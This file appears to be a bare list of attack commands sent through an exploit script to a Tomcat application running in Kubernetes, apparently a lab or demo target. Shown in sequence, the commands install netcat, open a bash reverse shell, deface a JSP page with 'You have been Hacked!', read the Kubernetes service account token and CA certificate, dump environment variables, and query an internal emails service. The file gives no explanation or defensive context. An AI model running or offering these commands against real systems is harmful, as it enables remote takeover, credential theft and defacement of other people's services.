python3 exploit.py http://192.168.64.2:30004 "curl www.google.com"


python3 exploit.py http://192.168.64.2:30004  "sed -i \'s/deb.debian.org/archive.debian.org/g\' /etc/apt/sources.list"

python3 exploit.py http://192.168.64.2:30004  "apt-get update"


python3 exploit.py http://192.168.64.2:30004  "apt-get install -y --force-yes netcat"

python3 exploit.py http://192.168.64.2:30004 "bash -i >& /dev/tcp/192.168.64.2/443 0>&1"

python3 exploit.py http://192.168.64.2:30004 "cat /usr/local/tomcat/webapps/ROOT/showcase.jsp"

python3 exploit.py http://192.168.64.2:30004 "sed -i 's/Welcome!/You have been Hacked!/g' /usr/local/tomcat/webapps/ROOT/showcase.jsp"

python3 exploit.py http://192.168.64.2:30004 'sed -i '\''s/Welcome!/You have been Hacked!/g'\'' /usr/local/tomcat/webapps/ROOT/showcase.jsp'

python3 exploit.py http://192.168.64.2:30004 "mv /usr/local/tomcat/webapps/ROOT/showcase.jsp /usr/local/tomcat/webapps/ROOT/fakeshowcase.jsp"


python3 exploit.py http://192.168.64.2:30004 "touch /usr/local/tomcat/webapps/ROOT/showcase.jsp"


python3 hack.py http://192.168.64.2:30004 'sh -c "echo You have been Hacked! >> /usr/local/tomcat/webapps/ROOT/showcase.jsp"'


python3 hack.py http://192.168.64.2:30004 'sh -c "echo Hello"'


python3 hack.py http://192.168.64.2:30004 "cat /usr/local/tomcat/webapps/ROOT/showcase.jsp"


python3 exploit.py http://192.168.64.2:30004  "rm /tmp/hacked.txt"


#######################################


python3 exploit.py http://192.168.64.2:30004 "curl www.google.com"

python3 hack.py http://192.168.64.2:30004 'sh -c "echo Hello"'

python3 exploit.py http://192.168.64.2:30004  "cat /tmp/hacked.txt"


python3 exploit.py http://192.168.64.2:30004  "cat /etc/hosts"

python3 exploit.py http://192.168.64.2:30004  "ls -la /usr/local/tomcat/"

python3 exploit.py http://192.168.64.2:30004  "whoami"

python3 exploit.py http://192.168.64.2:30004  "ls -la /var/run/secrets/kubernetes.io/serviceaccount"

python3 exploit.py http://192.168.64.2:30004  "cat /var/run/secrets/kubernetes.io/serviceaccount/token"

python3 exploit.py http://192.168.64.2:30004 "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

python3 exploit.py http://192.168.64.2:30004 "env"


python3 exploit.py http://192.168.64.2:30004 "curl -k -v http://10.244.120.76:3000/emails"


python3 exploit.py http://192.168.64.2:30004 "mv /tmp/hacked.txt /usr/local/tomcat/webapps/ROOT/showcase.jsp"


python3 exploit.py http://192.168.64.2:30004  "kubectl"


##########################################




